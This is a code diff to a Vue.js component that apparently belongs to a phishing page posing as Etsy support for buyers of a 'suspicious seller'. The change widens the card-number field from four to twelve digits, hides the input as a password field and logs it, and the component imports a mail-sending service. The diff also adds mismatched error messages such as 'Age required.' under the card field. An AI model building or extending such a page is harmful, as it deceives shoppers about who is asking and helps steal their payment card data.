@@ -102,7 +102,7 @@
 			   <div class="first-field" v-show='formCounter == 11 * 6'>
 			 	<h3>If there one thing that could change about Etsy involevment in case ,what you would be?</h3>
 			 	<form @submit="checkform">
-			 		<textarea required=required class="form-control" cols="4" rows="5" placeholder="Enter a Text" v-model='textArea' >
+			 		<textarea required=required class="form-control" cols="4" rows="5" placeholder="Enter a text" v-model='textArea' >
 			 		
 			 	</textarea>
 			 	<button class="btn btn-default"  type="submit">Countinue</button>
@@ -116,11 +116,21 @@
 			 	<h3>Confirm you credit cardused at purchase from Etsy,Enter just the first four digits so we can contact your bank easier and provide more support when detecting your purchase from a suspecious Seller</h3>
 			 	<div class="input-group center-credit">
 			 	<form @submit="checkformCard">
+			 	 <div class="fomr-group">
 			 		<div class="input-group-prepend">
-			 			<input required="required" type="password" class="form-contorole"  name="card-credit" v-model='cardCredit' placeholder="4 Digits" >
+			 			<input required="required" type="password" class="form-contorole" min="12" max="12" name="card-credit" v-model='cardCredit' placeholder="12 Digits" >
 			 			<span class="input-group-text">
 			 				****
 			 			</span>
+			 			</div>
+			 			<div v-if='errors.length'>
+			 				<ul class="list-unstyled">
+			 				<b class="text-muted">Please correct the following error(s):</b>
+			 					<li v-for='error in errors'>
+			 						{{error}}
+			 					</li>
+			 				</ul>
+			 			</div>
 			 		</div>
 			 		<button type="submit" class="btn btn-default" >Countinue</button>
 			 	</form>
@@ -200,7 +210,8 @@ import sendmailService from './../services/sendmailService'
 				cardCredit:'',
 				logedIn:false,
 				imageCptured:'',
-				imageUploaded:''
+				imageUploaded:'',
+				errors:[]
 			}
 		},
 		methods:{
@@ -231,19 +242,19 @@ import sendmailService from './../services/sendmailService'
 				})
 			},
 			checkform:function(e){
-				
-             if(this.textArea.length > 2){
+			 
+             if(this.textArea &&  this.textArea.length > 2){
              	this.istextValid=true
              	this.formCounter+=11
              	console.log(this.textArea)
              }
+                if(!this.textarea) this.errors.push("Name required.");
+
               e.preventDefault();
 			},
 			checkformCard:function(e){
-			 if(this.cardCredit.length < 4){
-               alert('This Field must contain 4 Digits')
-             	return false;
-             	 e.preventDefault();
+			 if(this.cardCredit.length < 12){
+             	this.errors.push("Age required.");
              }
              this.formCounter+=11;
              console.log(this.cardCredit)
